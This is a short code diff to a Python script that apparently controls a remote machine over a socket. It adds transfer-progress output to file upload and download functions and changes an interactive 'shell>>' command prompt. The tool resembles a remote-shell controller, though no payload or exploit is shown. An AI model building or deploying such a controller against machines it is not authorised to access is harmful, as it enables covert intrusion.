@@ -214,7 +214,8 @@ def upload_file(namafile):
             if not data:
                 break
             _target.sendall(data)
-        print('uploaded')  
+            print(f'{f.tell()}/{filesize} bytes ({f.tell()/filesize*100:.2f}%)', end='\r')
+        print('\nuploaded')  
 
 def download_file(namafile):
     bufsize = 65536
@@ -232,7 +233,8 @@ def download_file(namafile):
                     break
                 file.write(data)
                 recv += len(data)
-        print('downloaded')
+                print(f'{recv}/{filesize} bytes ({recv/filesize*100:.2f})', end='\r')
+        print('\ndownloaded')
 
 def data_diterima():
         data = ''
@@ -250,7 +252,7 @@ def shellc():
     print("Type 'help' for help")
     while True:
         try:
-            perintah = input('shell> ')
+            perintah = input('shell>> ')
             data = json.dumps(perintah)
             _target.send(data.encode())
             if perintah in('exit','quit'):
